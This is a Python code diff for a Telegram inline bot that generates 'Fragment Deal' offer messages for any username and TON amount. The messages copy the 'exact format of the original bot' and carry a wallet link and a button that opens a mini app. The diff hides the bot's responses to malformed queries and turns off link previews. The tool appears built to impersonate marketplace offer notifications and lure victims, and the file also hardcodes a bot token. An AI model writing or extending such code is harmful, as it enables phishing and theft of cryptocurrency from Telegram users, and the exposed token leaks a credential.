@@ -13,13 +13,13 @@ from telegram.ext import Application, InlineQueryHandler, ContextTypes
 BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
 PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
-WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web
+BOT_USERNAME = "DirectOfferNotification_bot"  # 🔗 Nom de votre bot
 
 print(f"🤖 Inline Fragment Deal Generator v4.7")
 print(f"🔑 Token: ✅")
 print(f"🌐 Port: {PORT}")
 print(f"🔗 Webhook: {WEBHOOK_URL}")
-print(f"📱 Web App: {WEBAPP_URL}")
+print(f"🤖 Bot: @{BOT_USERNAME}")
 
 # Variables globales
 app = None
@@ -136,9 +136,10 @@ Important:
         ))
         print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
     
-    # 📱 BOUTON STARTAPP - Ouvre l'app via le bot Telegram
-    startapp_params = f"user={username}&price={price:g}"
-    startapp_url = f"https://t.me/DirectOfferNotification_bot/request?startapp={startapp_params}"
+    # 📱 BOUTON STARTAPP - Génère un lien t.me avec startapp
+    startapp_param = f"{username}-{price:g}"
+    startapp_url = f"https://t.me/{BOT_USERNAME}/request?startapp={startapp_param}"
+    
     keyboard = InlineKeyboardMarkup([[
         InlineKeyboardButton(
             "View Details", 
@@ -151,66 +152,60 @@ Important:
     return fragment_message, entities, keyboard
 
 async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Gestionnaire pour les reqêtes inline"""
+    """Gestionnaire des requêtes inline"""
     try:
-        query = update.inline_query.query.strip()
-        print(f"🔍 Requête inline reçue: '{query}'")
+        from telegram import InlineQueryResultArticle, InputTextMessageContent
         
+        query = update.inline_query.query.strip() if update.inline_query.query else ""
+        
+        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
         if not query:
-            print("❌ Requête vide, ignorée")
-            await update.inline_query.answer([])
+            await update.inline_query.answer([], cache_time=0)
             return
         
-        # Séparer username et montant
+        # Parsing de la requête (username montant)
         parts = query.split()
-        if len(parts) != 2:
-            print(f"❌ Format invalide: {len(parts)} parties (attendu: 2)")
-            await update.inline_query.answer([])
+        
+        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
+        if len(parts) < 2:
+            await update.inline_query.answer([], cache_time=0)
             return
         
-        username = parts[0].replace('@', '')
+        username = parts[0].replace('@', '')  # Supprime @ si présent
+        
         try:
             ton_amount = float(parts[1])
+            if ton_amount <= 0:
+                raise ValueError("Montant doit être positif")
         except ValueError:
-            print(f"❌ Montant invalide: {parts[1]}")
-            await update.inline_query.answer([])
+            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
+            await update.inline_query.answer([], cache_time=0)
             return
         
-        # Validation
-        if len(username) < 5 or len(username) > 32:
-            print(f"❌ Username invalide (longueur): {username}")
-            await update.inline_query.answer([])
-            return
+        # Génération du message avec le format exact du bot original
+        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
         
-        if ton_amount <= 0 or ton_amount > 1000000:
-            print(f"❌ Montant invalide (valeur): {ton_amount}")
-            await update.inline_query.answer([])
-            return
+        # Prix actuel pour l'affichage
+        current_ton_price = get_ton_price()
+        current_usd_value = ton_amount * current_ton_price
         
-        print(f"✅ Génération message pour @{username} - {ton_amount} TON")
+        # Résultat inline - SEULEMENT si format correct
+        results = [
+            InlineQueryResultArticle(
+                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
+                title=f"Fragment Deal: @{username}",
+                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
+                input_message_content=InputTextMessageContent(
+                    fragment_message,
+                    entities=entities,
+                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
+                ),
+                reply_markup=keyboard
+            )
+        ]
         
-        # Génération du message
-        message_text, entities, keyboard = generate_fragment_message(username, ton_amount)
-        
-        # Résultat inline
-        from telegram import InlineQueryResultArticle, InputTextMessageContent
-        import uuid
-        
-        result = InlineQueryResultArticle(
-            id=str(uuid.uuid4()),
-            title=f"Fragment Deal: @{username}",
-            description=f"💎 {ton_amount:g} TON (${ton_amount * get_ton_price():.2f} USD)",
-            input_message_content=InputTextMessageContent(
-                message_text=message_text,
-                entities=entities,
-                disable_web_page_preview=True
-            ),
-            reply_markup=keyboard
-        )
-        
-        # Envoi de la réponse
-        await update.inline_query.answer([result], cache_time=0)
-        print(f"✅ Message généré et envoyé pour @{username}")
+        await update.inline_query.answer(results, cache_time=0)
+        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON (${current_usd_value:.2f})")
         
     except Exception as e:
         print(f"❌ Erreur dans inline_query_handler: {e}")
@@ -259,7 +254,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n🔗 StartApp: t.me/{BOT_USERNAME}/request"
         self.wfile.write(status.encode('utf-8'))
     
     def log_message(self, format, *args):
